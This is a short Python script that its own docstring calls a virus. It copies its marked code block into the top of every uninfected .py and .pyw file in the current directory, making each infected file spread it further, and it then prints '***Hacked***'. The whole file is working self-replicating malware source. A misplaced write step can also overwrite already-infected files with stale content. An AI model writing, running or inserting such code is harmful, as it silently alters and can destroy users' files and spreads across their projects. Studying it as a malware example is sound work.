#!/usr/bin/env python3
"""
    This virus will be injected in every file of the current dir.
    It's a chain reaction every infected file will infect the other 
    files as well
    Hoo hahahah
"""
#TODO:: use threading for efficiency &  add more functionality 

### Start Of Virus ###
import sys,glob
code = []

with open(sys.argv[0],'r') as f:
    #*argv[0] is the file itself & read all the lines
    liens = f.readlines()

virus_area = False
#*this loop appends everything until we hit the "###End.." line
for line in liens:
    if(line == "### Start Of Virus ###\n"):
        #*'\n' bcz. readlines takes a newsline at the end
        virus_area = True
    if(virus_area):
        code.append(line)
    if(line == "### End Of Virus ###\n"):
        break
    #print(code)

#*get all the python files
python_files = glob.glob("*.py") + glob.glob("*.pyw")
#print(python_files)

#* check if the files are infected or not 
for script in python_files:
    with open(script,'r') as f:
        script_code = f.readlines()

    infected = False
    for line in script_code:
        if(line == "### Start Of Virus ###\n"):
            infected = True
            break
    
    if(not infected):
        final_code = []
        #*adding the virus code
        final_code.extend(code)
        #*to give a line b/w actual code & our infected code in the file
        final_code.extend("\n")
        #*adding original code of the file
        final_code.extend(script_code)

    #*open the files & put our virus in the files
    with open(script,'w') as f:
        f.writelines(final_code)

#? Malicious code(Payload) 
print("***Hacked***")
### End Of Virus ###